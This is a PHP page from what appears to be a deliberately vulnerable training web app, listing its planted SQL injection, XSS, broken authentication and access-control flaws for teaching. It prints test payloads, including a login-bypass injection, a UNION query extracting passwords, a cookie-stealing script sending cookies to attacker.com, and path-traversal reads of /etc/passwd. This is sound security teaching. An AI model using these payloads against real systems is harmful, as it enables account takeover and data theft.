<?php
ob_start();
require_once 'config.php';

if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

$title = 'Vulnerability Guide';
include 'header.php';
?>

<div class="row">
    <div class="col-md-12">
        <div class="jumbotron bg-danger text-white p-4 rounded mb-4">
            <h1 class="display-5">🎯 VulnWeb - Vulnerability Guide</h1>
            <p class="lead">Complete guide to vulnerabilities implemented in this application for Cyber Kill Chain training.</p>
        </div>
    </div>
</div>

<div class="row">
    <div class="col-md-6">
        <div class="card mb-4">
            <div class="card-header bg-danger text-white">
                <h5>💉 SQL Injection Vulnerabilities</h5>
            </div>
            <div class="card-body">
                <h6>Locations:</h6>
                <ul>
                    <li><strong>Login Form:</strong> <code>login.php</code> - Authentication bypass</li>
                    <li><strong>Product Search:</strong> <code>products.php</code> - Data extraction</li>
                    <li><strong>Orders Page:</strong> <code>orders.php</code> - Access control bypass</li>
                    <li><strong>Admin Panel:</strong> <code>admin.php</code> - Direct SQL execution</li>
                </ul>
                
                <h6>Test Payloads:</h6>
                <pre class="small bg-light p-2">
-- Authentication Bypass
username: admin'--
password: anything

-- Union-based injection
search: ' UNION SELECT 1,username,password,4,5 FROM users--

-- Boolean-based
search: ' AND 1=1--
search: ' AND 1=2--
                </pre>
                
                <h6>Impact:</h6>
                <ul>
                    <li>Authentication bypass</li>
                    <li>Data extraction (usernames, passwords)</li>
                    <li>Database manipulation</li>
                    <li>Privilege escalation</li>
                </ul>
            </div>
        </div>

        <div class="card mb-4">
            <div class="card-header bg-warning text-dark">
                <h5>🚨 Cross-Site Scripting (XSS)</h5>
            </div>
            <div class="card-body">
                <h6>Locations:</h6>
                <ul>
                    <li><strong>Comment System:</strong> <code>comments.php</code> - Stored XSS</li>
                    <li><strong>Error Messages:</strong> Various pages - Reflected XSS</li>
                    <li><strong>Profile Updates:</strong> <code>profile.php</code> - Stored XSS</li>
                </ul>
                
                <h6>Test Payloads:</h6>
                <pre class="small bg-light p-2">
-- Basic XSS
&lt;script&gt;alert('XSS')&lt;/script&gt;

-- Image-based XSS
&lt;img src=x onerror=alert('XSS')&gt;

-- SVG XSS
&lt;svg onload=alert('XSS')&gt;

-- Cookie stealing
&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;
                </pre>
                
                <h6>Impact:</h6>
                <ul>
                    <li>Session hijacking</li>
                    <li>Credential theft</li>
                    <li>Malicious redirects</li>
                    <li>Defacement</li>
                </ul>
            </div>
        </div>
    </div>

    <div class="col-md-6">
        <div class="card mb-4">
            <div class="card-header bg-info text-white">
                <h5>🔐 Broken Authentication</h5>
            </div>
            <div class="card-body">
                <h6>Vulnerabilities:</h6>
                <ul>
                    <li><strong>Weak Passwords:</strong> No complexity requirements</li>
                    <li><strong>Predictable Sessions:</strong> MD5 hash of username + time</li>
                    <li><strong>No Account Lockout:</strong> Unlimited login attempts</li>
                    <li><strong>Session Fixation:</strong> Session ID not regenerated</li>
                    <li><strong>Insecure Cookies:</strong> No HTTPOnly or Secure flags</li>
                </ul>
                
                <h6>Test Scenarios:</h6>
                <ul>
                    <li>Brute force login attempts</li>
                    <li>Session token prediction</li>
                    <li>Password reset manipulation</li>
                    <li>Session hijacking via XSS</li>
                </ul>
                
                <h6>Impact:</h6>
                <ul>
                    <li>Account takeover</li>
                    <li>Unauthorized access</li>
                    <li>Identity theft</li>
                    <li>Privilege escalation</li>
                </ul>
            </div>
        </div>

        <div class="card mb-4">
            <div class="card-header bg-secondary text-white">
                <h5>🛡️ Broken Access Control</h5>
            </div>
            <div class="card-body">
                <h6>Vulnerabilities:</h6>
                <ul>
                    <li><strong>IDOR:</strong> Direct object reference in URLs</li>
                    <li><strong>Privilege Escalation:</strong> Role manipulation during registration</li>
                    <li><strong>Missing Authorization:</strong> No proper permission checks</li>
                    <li><strong>Path Traversal:</strong> Local file inclusion in admin panel</li>
                </ul>
                
                <h6>Test URLs:</h6>
                <pre class="small bg-light p-2">
-- View other users' orders
orders.php?user_id=1
orders.php?user_id=2

-- Access admin functions
admin.php (with user role)

-- File disclosure
admin.php?file=../config.php
admin.php?file=/etc/passwd
                </pre>
                
                <h6>Impact:</h6>
                <ul>
                    <li>Unauthorized data access</li>
                    <li>Horizontal privilege escalation</li>
                    <li>Vertical privilege escalation</li>
                    <li>Data manipulation</li>
                </ul>
            </div>
        </div>
    </div>
</div>

<div class="row">
    <div class="col-md-12">
        <div class="card">
            <div class="card-header bg-dark text-white">
                <h5>⚔️ Cyber Kill Chain Application</h5>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-4">
                        <h6>1. Reconnaissance</h6>
                        <ul class="small">
                            <li>Port scanning</li>
                            <li>Technology fingerprinting</li>
                            <li>Directory enumeration</li>
                            <li>Information disclosure via debug mode</li>
                        </ul>

                        <h6>2. Weaponization</h6>
                        <ul class="small">
                            <li>Crafting SQL injection payloads</li>
                            <li>Creating XSS payloads</li>
                            <li>Preparing privilege escalation exploits</li>
                        </ul>
                    </div>
                    
                    <div class="col-md-4">
                        <h6>3. Delivery</h6>
                        <ul class="small">
                            <li>Injecting via login forms</li>
                            <li>XSS through comment system</li>
                            <li>Parameter manipulation in URLs</li>
                        </ul>

                        <h6>4. Exploitation</h6>
                        <ul class="small">
                            <li>SQL injection execution</li>
                            <li>XSS payload execution</li>
                            <li>Authentication bypass</li>
                            <li>IDOR exploitation</li>
                        </ul>
                    </div>
                    
                    <div class="col-md-4">
                        <h6>5. Installation</h6>
                        <ul class="small">
                            <li>Creating persistent XSS</li>
                            <li>Injecting admin accounts</li>
                            <li>Session fixation</li>
                        </ul>

                        <h6>6. Command & Control</h6>
                        <ul class="small">
                            <li>Admin panel access</li>
                            <li>SQL console usage</li>
                            <li>User management</li>
                        </ul>

                        <h6>7. Actions on Objectives</h6>
                        <ul class="small">
                            <li>Data exfiltration</li>
                            <li>Account manipulation</li>
                            <li>System compromise</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="row mt-4">
    <div class="col-md-12">
        <div class="alert alert-warning">
            <h5>⚠️ Important Notes for Students</h5>
            <ul class="mb-0">
                <li>This application is intentionally vulnerable and should only be used in controlled environments</li>
                <li>Practice ethical hacking principles - only test on systems you own or have permission to test</li>
                <li>Document your findings and create mitigation strategies for each vulnerability</li>
                <li>Use tools like Burp Suite, OWASP ZAP, or sqlmap to automate testing</li>
                <li>Always follow responsible disclosure practices in real-world scenarios</li>
            </ul>
        </div>
    </div>
</div>

<?php include 'footer.php'; ?>